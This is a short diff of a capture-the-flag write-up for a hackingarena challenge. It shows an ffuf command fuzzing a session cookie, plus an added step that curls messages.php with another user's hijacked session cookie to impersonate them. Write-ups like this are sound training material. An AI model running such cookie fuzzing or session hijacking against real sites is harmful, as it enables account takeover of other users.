@@ -39,7 +39,11 @@ ffuf -u http://koala.hackingarena.no:803/messages.php -H "Cookie: CalypId=TWFybG
 
 ![[Pasted image 20241115223648.png]]
 
-Lastly, curl the website with Marlow's activ
+Lastly, curl the website with Marlow's session as CalypId using following command:
+
+curl -b "CalypId=TWFybG931731580990" "http://koala.hackingarena.no:803/messages.php"
+
+![[Pasted image 20241115224054.png]]
 # Additional Info
 
 Additional solution / info
